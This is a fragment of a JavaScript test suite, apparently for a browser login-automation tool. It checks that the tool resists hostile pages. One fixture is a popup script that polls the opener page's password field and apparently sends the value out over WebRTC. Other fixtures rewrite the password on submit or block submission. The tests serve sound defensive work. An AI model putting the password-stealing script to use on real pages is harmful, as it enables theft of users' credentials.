        fixture.popup = `<script>setInterval(() => { const pw = opener.document.forms[0]?.pw.value; if (pw) { ${rtc("window")} } }, 50);</script>`;
        fixture.page = `${loginForm()}<a href="/popup" target="side">side</a><script>document.querySelector("a").click();</script>`;

        await run();

        expect(datagrams).toStrictEqual([]);
        expect(context.pages()).toStrictEqual([page]);
    });

    it("does not send the form when the page re-encodes the password first", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", () => { const field = document.forms[0].pw; field.value = [...field.value].reverse().join(""); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
    });

    it("stops waiting on a submit handler that does not return", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); const end = Date.now() + 7000; while (Date.now() < end) {} });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("did not finish"), submitted: false, success: false });
    });
});
